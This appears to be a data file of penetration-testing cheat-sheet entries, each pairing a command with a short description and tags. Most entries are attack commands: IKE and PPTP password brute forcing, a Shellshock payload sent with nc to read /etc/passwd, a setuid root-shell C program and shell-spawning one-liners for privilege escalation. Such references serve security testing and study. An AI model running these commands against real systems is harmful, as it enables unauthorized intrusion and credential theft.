EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
EOR
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
Try to brute the remote group name : cisco
EOC
scanning
brute
cisco
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
https://github.com/SpiderLabs/ikeforce
https://www.trustwave.com/Resources/SpiderLabs-Blog/Cracking-IKE-Mission-Improbable-(Part-1)/
EOR
sed -i 's/[[:space:]]*$//' [input]
Remove trailing whitespace
EOC
linux
bash
text manipulation
EOT
http://ask.xmodulo.com/remove-trailing-whitespaces-linux.html
EOR
thc-pptp-bruter -u [username] -W -w /usr/share/wordlists/nmap.lst
Brute force PPTP password
EOC
brute
scanning
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
EOR
./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
NCC Shellshock tool
EOC
linux
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
git clone https://github.com/nccgroup/shocker
EOR
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
Shellshock Read File : Replace echo with anything you want
EOC
linux
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
EOR
php -S 0.0.0.0:80
PHP simple server
EOC
pivoting
interesting
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
EOR
int main(void){setresuid(0, 0, 0);system("/bin/bash");}
Simple SUID program  
EOC
linux
privilege escalation
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
EOR
perl -e 'exec "/bin/bash";'
perl spawn bash
EOC
perl
shell
privilege escalation
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
EOR
python -c 'import pty;pty.spawn("/bin/bash")'
python spawn bash
EOC
python
shell
privilege escalation
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
EOR
!bash
Call a shell from a number of programs, VIM, Nmap FTP SFTP etc
EOC
linux
shell
privilege escalation
EOT
https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
EOR
